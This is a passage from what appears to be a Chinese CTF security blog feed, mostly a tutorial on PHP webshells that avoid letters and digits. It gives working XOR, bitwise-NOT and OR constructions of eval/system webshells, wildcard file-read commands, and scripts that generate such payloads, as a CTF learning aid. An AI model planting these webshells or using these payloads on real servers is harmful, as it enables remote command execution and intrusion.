class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;flag.php&quot;</span>;<br><br><span class="hljs-variable">$year</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;year&#x27;</span>];<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$year</span>==<span class="hljs-number">2022</span> &amp;&amp; <span class="hljs-variable">$year</span>+<span class="hljs-number">1</span>!==<span class="hljs-number">2023</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>这里可以使用科学计数法绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?year=<span class="hljs-number">202.2e1</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>PHP</category>
      
      <category>WEB</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WEB</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>无字母数字webshell</title>
    <link href="/2023/01/18/No_alphanumeric_webshell/"/>
    <url>/2023/01/18/No_alphanumeric_webshell/</url>
    
    <content type="html"><![CDATA[<p>老生常谈的东西了，但之前一直没有好好总结。在2023山石网科CTF冬令营结营赛遇到了一道题当时没解出来，后面花了两天时间解出来了，非常痛苦，现在好好总结一下。</p><h2 id="无字母数字WebShell"><a href="#无字母数字WebShell" class="headerlink" title="无字母数字WebShell"></a>无字母数字WebShell</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[a-z0-9]/is&#x27;</span>,<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;shell&#x27;</span>])) &#123;<br>  <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;shell&#x27;</span>]);<br>&#125;<br></code></pre></td></tr></table></figure><p>基本上就是对上述正则表达式进行绕过，不能传入字母和数字。</p><h2 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h2><h3 id="PHP短标签"><a href="#PHP短标签" class="headerlink" title="PHP短标签"></a>PHP短标签</h3><p>除了最常见的PHP标签<code>&lt;?php ?&gt;</code>之外，PHP还有两种短标签</p><ul><li><code>&lt;??&gt;</code>  相当于 <code>&lt;?php&gt;</code></li><li><code>&lt;?=?&gt;</code> 相当于 <code>&lt;?echo&gt;</code></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?=</span><span class="hljs-string">&#x27;111&#x27;</span><span class="hljs-meta">?&gt;</span>  <span class="hljs-comment">//会输出111</span><br></code></pre></td></tr></table></figure><p>在PHP5.4以后，无论short_open_tag是否开启，<code>&lt;?=?&gt;</code>这种写法总是适用的，<code>&lt;??&gt;</code>这种写法则需要short_open_tag开启才行。</p><h3 id="通配符"><a href="#通配符" class="headerlink" title="通配符"></a>通配符</h3><ul><li>在正则表达式中，<code>?</code> 与其它字符一起组合成表达式，<strong>匹配前面的字符或表达式零次或一次</strong>。</li><li>在 Shell 命令行中，<code>?</code> 与其它字符一起组合成表达式，<strong>匹配任意一个字符</strong>。</li><li>在正则表达式中，<code>*</code> 与其它字符一起组合成表达式，<strong>匹配前面的字符或表达式零次或多次</strong>。</li><li>在 Shell 命令行中，<code>*</code> 与其它字符一起组合成表达式，<strong>匹配任意长度的字符串</strong>。这个字符串的长度可以是0，可以是1，可以是任意数字。</li></ul><p>所以，我们可以利用<code>?</code>和<code>*</code>在正则表达式和Shell命令行中的区别，绕过关键字过滤：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs shell">假设flag在/flag中:<br>cat /fla?<br>cat /fla*<br>    <br>假设flag在/flag.txt中:<br>cat /fla????<br>cat /fla*<br>    <br>假设flag在/root/flag.txt中:<br>cat /roo?/fla????<br>cat /ro*/fla*<br>    <br>假设flag在flagg文件加里:<br>cat /?????/fla?<br>cat /?????/fla*<br></code></pre></td></tr></table></figure><p>我们可以用以上格式的Payload读取flag</p><h3 id="PHP5与PHP7的区别"><a href="#PHP5与PHP7的区别" class="headerlink" title="PHP5与PHP7的区别"></a>PHP5与PHP7的区别</h3><ul><li><p>在 PHP 5 中，<code>assert()</code> 是一个函数，我们可以用 <code>$_=assert;$_()</code> 这样的形式来实现代码的动态执行。</p></li><li><p>在 PHP 7 中，<code>assert()</code> 变成了一个和 <code>eval()</code> 一样的语言结构，不再支持上面那种调用方法。（但是好像在 PHP 7.0.12 下还能这样调用）</p></li><li><p>PHP5中，是不支持 <code>($a)()</code> 这种调用方法的，但在 PHP 7 中支持这种调用方法，因此支持这么写 <code>(&#39;phpinfo&#39;)();</code></p></li></ul><h2 id="异或"><a href="#异或" class="headerlink" title="异或"></a>异或</h2><p>在PHP中，两个字符串执行异或操作以后，得到的还是一个字符串。所以，我们想得到a-z中某个字母，就找到某两个非字母、数字的字符，他们的异或结果是这个字母即可。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php">php &gt; <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-string">&#x27;%01&#x27;</span>) ^ <span class="hljs-string">&#x27;`&#x27;</span>;<br>a<br>php &gt; <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-string">&#x27;%02&#x27;</span>) ^ <span class="hljs-string">&#x27;`&#x27;</span>;<br>b<br>php &gt; <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-string">&#x27;%03&#x27;</span>) ^ <span class="hljs-string">&#x27;`&#x27;</span>;<br>c<br>php &gt; <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-string">&#x27;%18&#x27;</span>) ^ <span class="hljs-string">&#x27;`&#x27;</span>;<br>x<br></code></pre></td></tr></table></figure><h3 id="PHP5"><a href="#PHP5" class="headerlink" title="PHP5"></a>PHP5</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$_</span>=(<span class="hljs-string">&#x27;%01&#x27;</span>^<span class="hljs-string">&#x27;`&#x27;</span>).(<span class="hljs-string">&#x27;%13&#x27;</span>^<span class="hljs-string">&#x27;`&#x27;</span>).(<span class="hljs-string">&#x27;%13&#x27;</span>^<span class="hljs-string">&#x27;`&#x27;</span>).(<span class="hljs-string">&#x27;%05&#x27;</span>^<span class="hljs-string">&#x27;`&#x27;</span>).(<span class="hljs-string">&#x27;%12&#x27;</span>^<span class="hljs-string">&#x27;`&#x27;</span>).(<span class="hljs-string">&#x27;%14&#x27;</span>^<span class="hljs-string">&#x27;`&#x27;</span>); <span class="hljs-comment">// $_=&#x27;assert&#x27;;</span><br><span class="hljs-variable">$__</span>=<span class="hljs-string">&#x27;_&#x27;</span>.(<span class="hljs-string">&#x27;%0D&#x27;</span>^<span class="hljs-string">&#x27;]&#x27;</span>).(<span class="hljs-string">&#x27;%2F&#x27;</span>^<span class="hljs-string">&#x27;`&#x27;</span>).(<span class="hljs-string">&#x27;%0E&#x27;</span>^<span class="hljs-string">&#x27;]&#x27;</span>).(<span class="hljs-string">&#x27;%09&#x27;</span>^<span class="hljs-string">&#x27;]&#x27;</span>); <span class="hljs-comment">// $__=&#x27;_POST&#x27;;</span><br><span class="hljs-variable">$___</span>=<span class="hljs-variable">$$__</span>;<br><span class="hljs-variable">$_</span>(<span class="hljs-variable">$___</span>[_]); <span class="hljs-comment">// assert($_POST[_]);</span><br></code></pre></td></tr></table></figure><p>这种攻击方法在PHP5中是可行的，如前面所说，在PHP7中，assert已经成为了一种语言结构，不支持这种调用方式。</p><h3 id="PHP7"><a href="#PHP7" class="headerlink" title="PHP7"></a>PHP7</h3><p>assert不行了，我们换一个函数其实也可以。这里使用system()函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$_</span>=(<span class="hljs-string">&#x27;%13&#x27;</span> ^ <span class="hljs-string">&#x27;`&#x27;</span>).(<span class="hljs-string">&#x27;%19&#x27;</span> ^ <span class="hljs-string">&#x27;`&#x27;</span>).(<span class="hljs-string">&#x27;%13&#x27;</span> ^ <span class="hljs-string">&#x27;`&#x27;</span>).(<span class="hljs-string">&#x27;%14&#x27;</span> ^ <span class="hljs-string">&#x27;`&#x27;</span>).(<span class="hljs-string">&#x27;%05&#x27;</span> ^ <span class="hljs-string">&#x27;`&#x27;</span>).(<span class="hljs-string">&#x27;%0d&#x27;</span> ^ <span class="hljs-string">&#x27;%60&#x27;</span>);<span class="hljs-variable">$__</span>=<span class="hljs-string">&#x27;_&#x27;</span>.(<span class="hljs-string">&#x27;%0D&#x27;</span>^<span class="hljs-string">&#x27;]&#x27;</span>).(<span class="hljs-string">&#x27;%2F&#x27;</span>^<span class="hljs-string">&#x27;`&#x27;</span>).(<span class="hljs-string">&#x27;%0E&#x27;</span>^<span class="hljs-string">&#x27;]&#x27;</span>).(<span class="hljs-string">&#x27;%09&#x27;</span>^<span class="hljs-string">&#x27;]&#x27;</span>);<span class="hljs-variable">$___</span>=<span class="hljs-variable">$$__</span>;<span class="hljs-variable">$_</span>(<span class="hljs-variable">$___</span>[_]);<br><br><span class="hljs-comment">//system($_POST[_])</span><br></code></pre></td></tr></table></figure><h3 id="异或构造脚本"><a href="#异或构造脚本" class="headerlink" title="异或构造脚本"></a>异或构造脚本</h3><p>首先运行以上 PHP 脚本后，会生成一个 txt 文档 xor_rce.txt，里面包含所有可见字符的异或构造结果，可以通过题目给的正则表达式修改正则。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br> <br><span class="hljs-variable">$myfile</span> = <span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&quot;xor_rce.txt&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>);<br><span class="hljs-variable">$contents</span>=<span class="hljs-string">&quot;&quot;</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">256</span>; <span class="hljs-variable">$i</span>++) &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-variable">$j</span>=<span class="hljs-number">0</span>; <span class="hljs-variable">$j</span> &lt;<span class="hljs-number">256</span> ; <span class="hljs-variable">$j</span>++) &#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$i</span>&lt;<span class="hljs-number">16</span>)&#123;<br>            <span class="hljs-variable">$hex_i</span>=<span class="hljs-string">&#x27;0&#x27;</span>.<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$i</span>);<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-variable">$hex_i</span>=<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$i</span>);<br>        &#125;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$j</span>&lt;<span class="hljs-number">16</span>)&#123;<br>            <span class="hljs-variable">$hex_j</span>=<span class="hljs-string">&#x27;0&#x27;</span>.<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$j</span>);<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-variable">$hex_j</span>=<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$j</span>);<br>        &#125;<br>        <span class="hljs-variable">$preg</span> = <span class="hljs-string">&#x27;/[a-z0-9]/i&#x27;</span>;    <span class="hljs-comment">// 根据题目给的正则表达式修改即可</span><br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-variable">$preg</span> , <span class="hljs-title function_ invoke__">hex2bin</span>(<span class="hljs-variable">$hex_i</span>))||<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-variable">$preg</span> , <span class="hljs-title function_ invoke__">hex2bin</span>(<span class="hljs-variable">$hex_j</span>)))&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&quot;</span>;<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-variable">$a</span>=<span class="hljs-string">&#x27;%&#x27;</span>.<span class="hljs-variable">$hex_i</span>;<br>            <span class="hljs-variable">$b</span>=<span class="hljs-string">&#x27;%&#x27;</span>.<span class="hljs-variable">$hex_j</span>;<br>            <span class="hljs-variable">$c</span>=(<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$a</span>)^<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$b</span>));<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$c</span>)&gt;=<span class="hljs-number">32</span>&amp;<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$c</span>)&lt;=<span class="hljs-number">126</span>) &#123;<br>                <span class="hljs-variable">$contents</span>=<span class="hljs-variable">$contents</span>.<span class="hljs-variable">$c</span>.<span class="hljs-string">&quot; &quot;</span>.<span class="hljs-variable">$a</span>.<span class="hljs-string">&quot; &quot;</span>.<span class="hljs-variable">$b</span>.<span class="hljs-string">&quot;\n&quot;</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$myfile</span>,<span class="hljs-variable">$contents</span>);<br><span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$myfile</span>);<br></code></pre></td></tr></table></figure><p>接着运行以下 Python 脚本，输入你想要构造的函数名和要执行的命令即可生成最终的 Payload：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">action</span>(<span class="hljs-params">arg</span>):<br>   s1=<span class="hljs-string">&quot;&quot;</span><br>   s2=<span class="hljs-string">&quot;&quot;</span><br>   <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> arg:<br>       f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;xor_rce.txt&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>)<br>       <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>           t=f.readline()<br>           <span class="hljs-keyword">if</span> t==<span class="hljs-string">&quot;&quot;</span>:<br>               <span class="hljs-keyword">break</span><br>           <span class="hljs-keyword">if</span> t[<span class="hljs-number">0</span>]==i:<br>               <span class="hljs-comment">#print(i)</span><br>               s1+=t[<span class="hljs-number">2</span>:<span class="hljs-number">5</span>]<br>               s2+=t[<span class="hljs-number">6</span>:<span class="hljs-number">9</span>]<br>               <span class="hljs-keyword">break</span><br>       f.close()<br>   output=<span class="hljs-string">&quot;(\&quot;&quot;</span>+s1+<span class="hljs-string">&quot;\&quot;^\&quot;&quot;</span>+s2+<span class="hljs-string">&quot;\&quot;)&quot;</span><br>   <span class="hljs-keyword">return</span>(output)<br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>   param=action(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;\n[+] your function：&quot;</span>) )+action(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;[+] your command：&quot;</span>))+<span class="hljs-string">&quot;;&quot;</span><br>   <span class="hljs-built_in">print</span>(param)<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">[+] your function：system<br>[+] your command：ls /<br>(&quot;%13%19%13%14%05%0d&quot;|&quot;%60%60%60%60%60%60&quot;)(&quot;%0c%13%00%00&quot;|&quot;%60%60%20%2f&quot;);<br></code></pre></td></tr></table></figure><h2 id="取反"><a href="#取反" class="headerlink" title="取反"></a>取反</h2><p>利用的是UTF-8编码的某个汉字，并将其中某个字符取出来，比如<code>&#39;和&#39;&#123;2&#125;</code>的结果是<code>&quot;\x8c&quot;</code>，其取反即为字母<code>s</code>：</p><p>P神的Webshell：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$__</span>=(<span class="hljs-string">&#x27;&gt;&#x27;</span>&gt;<span class="hljs-string">&#x27;&lt;&#x27;</span>)+(<span class="hljs-string">&#x27;&gt;&#x27;</span>&gt;<span class="hljs-string">&#x27;&lt;&#x27;</span>);<br><span class="hljs-variable">$_</span>=<span class="hljs-variable">$__</span>/<span class="hljs-variable">$__</span>;<br><br><span class="hljs-variable">$____</span>=<span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-variable">$___</span>=<span class="hljs-string">&quot;瞰&quot;</span>;<span class="hljs-variable">$____</span>.=~(<span class="hljs-variable">$___</span>&#123;<span class="hljs-variable">$_</span>&#125;);<span class="hljs-variable">$___</span>=<span class="hljs-string">&quot;和&quot;</span>;<span class="hljs-variable">$____</span>.=~(<span class="hljs-variable">$___</span>&#123;<span class="hljs-variable">$__</span>&#125;);<span class="hljs-variable">$___</span>=<span class="hljs-string">&quot;和&quot;</span>;<span class="hljs-variable">$____</span>.=~(<span class="hljs-variable">$___</span>&#123;<span class="hljs-variable">$__</span>&#125;);<span class="hljs-variable">$___</span>=<span class="hljs-string">&quot;的&quot;</span>;<span class="hljs-variable">$____</span>.=~(<span class="hljs-variable">$___</span>&#123;<span class="hljs-variable">$_</span>&#125;);<span class="hljs-variable">$___</span>=<span class="hljs-string">&quot;半&quot;</span>;<span class="hljs-variable">$____</span>.=~(<span class="hljs-variable">$___</span>&#123;<span class="hljs-variable">$_</span>&#125;);<span class="hljs-variable">$___</span>=<span class="hljs-string">&quot;始&quot;</span>;<span class="hljs-variable">$____</span>.=~(<span class="hljs-variable">$___</span>&#123;<span class="hljs-variable">$__</span>&#125;);<br><br><span class="hljs-variable">$_____</span>=<span class="hljs-string">&#x27;_&#x27;</span>;<span class="hljs-variable">$___</span>=<span class="hljs-string">&quot;俯&quot;</span>;<span class="hljs-variable">$_____</span>.=~(<span class="hljs-variable">$___</span>&#123;<span class="hljs-variable">$__</span>&#125;);<span class="hljs-variable">$___</span>=<span class="hljs-string">&quot;瞰&quot;</span>;<span class="hljs-variable">$_____</span>.=~(<span class="hljs-variable">$___</span>&#123;<span class="hljs-variable">$__</span>&#125;);<span class="hljs-variable">$___</span>=<span class="hljs-string">&quot;次&quot;</span>;<span class="hljs-variable">$_____</span>.=~(<span class="hljs-variable">$___</span>&#123;<span class="hljs-variable">$_</span>&#125;);<span class="hljs-variable">$___</span>=<span class="hljs-string">&quot;站&quot;</span>;<span class="hljs-variable">$_____</span>.=~(<span class="hljs-variable">$___</span>&#123;<span class="hljs-variable">$_</span>&#125;);<br><br><span class="hljs-variable">$_</span>=<span class="hljs-variable">$$_____</span>;<br><span class="hljs-variable">$____</span>(<span class="hljs-variable">$_</span>[<span class="hljs-variable">$__</span>]);<br></code></pre></td></tr></table></figure><p>利用了PHP的弱类型特性。因为要获取<code>&#39;和&#39;&#123;2&#125;</code>，就必须有数字2。而PHP由于弱类型这个特性，true的值为1，故<code>true+true==2</code>，也就是<code>(&#39;&gt;&#39;&gt;&#39;&lt;&#39;)+(&#39;&gt;&#39;&gt;&#39;&lt;&#39;)==2</code>。</p><h4 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$__</span>=(<span class="hljs-string">&#x27;&gt;&#x27;</span>&gt;<span class="hljs-string">&#x27;&lt;&#x27;</span>)+(<span class="hljs-string">&#x27;&gt;&#x27;</span>&gt;<span class="hljs-string">&#x27;&lt;&#x27;</span>);<span class="hljs-variable">$_</span>=<span class="hljs-variable">$__</span>/<span class="hljs-variable">$__</span>;<span class="hljs-variable">$____</span>=<span class="hljs-string">&#x27;&#x27;</span>;<span class="hljs-variable">$___</span>=<span class="hljs-string">&quot;瞰&quot;</span>;<span class="hljs-variable">$____</span>.=~(<span class="hljs-variable">$___</span>&#123;<span class="hljs-variable">$_</span>&#125;);<span class="hljs-variable">$___</span>=<span class="hljs-string">&quot;和&quot;</span>;<span class="hljs-variable">$____</span>.=~(<span class="hljs-variable">$___</span>&#123;<span class="hljs-variable">$__</span>&#125;);<span class="hljs-variable">$___</span>=<span class="hljs-string">&quot;和&quot;</span>;<span class="hljs-variable">$____</span>.=~(<span class="hljs-variable">$___</span>&#123;<span class="hljs-variable">$__</span>&#125;);<span class="hljs-variable">$___</span>=<span class="hljs-string">&quot;的&quot;</span>;<span class="hljs-variable">$____</span>.=~(<span class="hljs-variable">$___</span>&#123;<span class="hljs-variable">$_</span>&#125;);<span class="hljs-variable">$___</span>=<span class="hljs-string">&quot;半&quot;</span>;<span class="hljs-variable">$____</span>.=~(<span class="hljs-variable">$___</span>&#123;<span class="hljs-variable">$_</span>&#125;);<span class="hljs-variable">$___</span>=<span class="hljs-string">&quot;始&quot;</span>;<span class="hljs-variable">$____</span>.=~(<span class="hljs-variable">$___</span>&#123;<span class="hljs-variable">$__</span>&#125;);<span class="hljs-variable">$_____</span>=_;<span class="hljs-variable">$___</span>=<span class="hljs-string">&quot;俯&quot;</span>;<span class="hljs-variable">$_____</span>.=~(<span class="hljs-variable">$___</span>&#123;<span class="hljs-variable">$__</span>&#125;);<span class="hljs-variable">$___</span>=<span class="hljs-string">&quot;瞰&quot;</span>;<span class="hljs-variable">$_____</span>.=~(<span class="hljs-variable">$___</span>&#123;<span class="hljs-variable">$__</span>&#125;);<span class="hljs-variable">$___</span>=<span class="hljs-string">&quot;次&quot;</span>;<span class="hljs-variable">$_____</span>.=~(<span class="hljs-variable">$___</span>&#123;<span class="hljs-variable">$_</span>&#125;);<span class="hljs-variable">$___</span>=<span class="hljs-string">&quot;站&quot;</span>;<span class="hljs-variable">$_____</span>.=~(<span class="hljs-variable">$___</span>&#123;<span class="hljs-variable">$_</span>&#125;);<span class="hljs-variable">$_</span>=<span class="hljs-variable">$$_____</span>;<span class="hljs-variable">$____</span>(<span class="hljs-variable">$_</span>[<span class="hljs-variable">$__</span>]);<br>或:<br><span class="hljs-variable">$__</span>=(<span class="hljs-string">&#x27;&gt;&#x27;</span>&gt;<span class="hljs-string">&#x27;&lt;&#x27;</span>)+(<span class="hljs-string">&#x27;&gt;&#x27;</span>&gt;<span class="hljs-string">&#x27;&lt;&#x27;</span>);<span class="hljs-variable">$_</span>=<span class="hljs-variable">$__</span>/<span class="hljs-variable">$__</span>;<span class="hljs-variable">$____</span>=<span class="hljs-string">&#x27;&#x27;</span>;<span class="hljs-variable">$___</span>=瞰;<span class="hljs-variable">$____</span>.=~(<span class="hljs-variable">$___</span>&#123;<span class="hljs-variable">$_</span>&#125;);<span class="hljs-variable">$___</span>=和;<span class="hljs-variable">$____</span>.=~(<span class="hljs-variable">$___</span>&#123;<span class="hljs-variable">$__</span>&#125;);<span class="hljs-variable">$___</span>=和;<span class="hljs-variable">$____</span>.=~(<span class="hljs-variable">$___</span>&#123;<span class="hljs-variable">$__</span>&#125;);<span class="hljs-variable">$___</span>=的;<span class="hljs-variable">$____</span>.=~(<span class="hljs-variable">$___</span>&#123;<span class="hljs-variable">$_</span>&#125;);<span class="hljs-variable">$___</span>=半;<span class="hljs-variable">$____</span>.=~(<span class="hljs-variable">$___</span>&#123;<span class="hljs-variable">$_</span>&#125;);<span class="hljs-variable">$___</span>=始;<span class="hljs-variable">$____</span>.=~(<span class="hljs-variable">$___</span>&#123;<span class="hljs-variable">$__</span>&#125;);<span class="hljs-variable">$_____</span>=_;<span class="hljs-variable">$___</span>=俯;<span class="hljs-variable">$_____</span>.=~(<span class="hljs-variable">$___</span>&#123;<span class="hljs-variable">$__</span>&#125;);<span class="hljs-variable">$___</span>=瞰;<span class="hljs-variable">$_____</span>.=~(<span class="hljs-variable">$___</span>&#123;<span class="hljs-variable">$__</span>&#125;);<span class="hljs-variable">$___</span>=次;<span class="hljs-variable">$_____</span>.=~(<span class="hljs-variable">$___</span>&#123;<span class="hljs-variable">$_</span>&#125;);<span class="hljs-variable">$___</span>=站;<span class="hljs-variable">$_____</span>.=~(<span class="hljs-variable">$___</span>&#123;<span class="hljs-variable">$_</span>&#125;);<span class="hljs-variable">$_</span>=<span class="hljs-variable">$$_____</span>;<span class="hljs-variable">$____</span>(<span class="hljs-variable">$_</span>[<span class="hljs-variable">$__</span>]);<br></code></pre></td></tr></table></figure><h3 id="URL编码取反绕过"><a href="#URL编码取反绕过" class="headerlink" title="URL编码取反绕过"></a>URL编码取反绕过</h3><p>刚才我们介绍的是通过取反汉字来得到我们想要的字母，我们还可以直接对一串恶意代码进行取反然后 URL 编码，在发送 Payload 的时候再次将其取反便可将代码还原，然后将其动态执行。并且，因为是取反，基本上用的都是不可见字符，所以不会触发到正则表达式。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">php &gt; <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(~<span class="hljs-string">&#x27;phpinfo&#x27;</span>);<br>%<span class="hljs-number">8</span>F%<span class="hljs-number">97</span>%<span class="hljs-number">8</span>F%<span class="hljs-number">96</span>%<span class="hljs-number">91</span>%<span class="hljs-number">99</span>%<span class="hljs-number">90</span><br>php &gt; <br></code></pre></td></tr></table></figure><h4 id="Payload："><a href="#Payload：" class="headerlink" title="Payload："></a>Payload：</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">(~%<span class="hljs-number">8</span>F%<span class="hljs-number">97</span>%<span class="hljs-number">8</span>F%<span class="hljs-number">96</span>%<span class="hljs-number">91</span>%<span class="hljs-number">99</span>%<span class="hljs-number">90</span>)();    <span class="hljs-comment">// phpinfo();</span><br></code></pre></td></tr></table></figure><h2 id="或运算"><a href="#或运算" class="headerlink" title="或运算"></a>或运算</h2><p>PHP 中两个字符串异或之后得到的还是一个字符串。那么或运算原理也是一样，如果正则匹配过滤了字母和数字，那就可以使用两个不在正则匹配范围内的非字母非数字的字符进行或运算，从而得到我们想要的字符串。</p><h3 id="或运算构造脚本"><a href="#或运算构造脚本" class="headerlink" title="或运算构造脚本"></a>或运算构造脚本</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 